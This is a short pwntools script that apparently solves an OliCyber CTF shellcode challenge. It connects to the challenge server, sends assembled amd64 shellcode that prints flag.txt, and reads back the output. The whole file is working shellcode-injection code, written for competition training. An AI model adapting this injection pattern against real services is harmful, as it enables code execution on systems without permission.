from pwn import *
r = remote("software-20.challs.olicyber.it", 13003)
r.recvuntil(b"qualsiasi")
r.recvline()
r.recvline()
r.sendline(b'')
r.recv()
r.recv()



shellcode_echo = pwnlib.shellcraft.amd64.linux.cat("flag.txt", sock='1')
shellcode_bash = asm(shellcode_echo, arch='x86_64')


len_shellcode = str(len(shellcode_bash)).encode()
r.sendline(len_shellcode)
print(r.recv())
r.send(shellcode_bash)
print(r.recv())
print(r.recv())
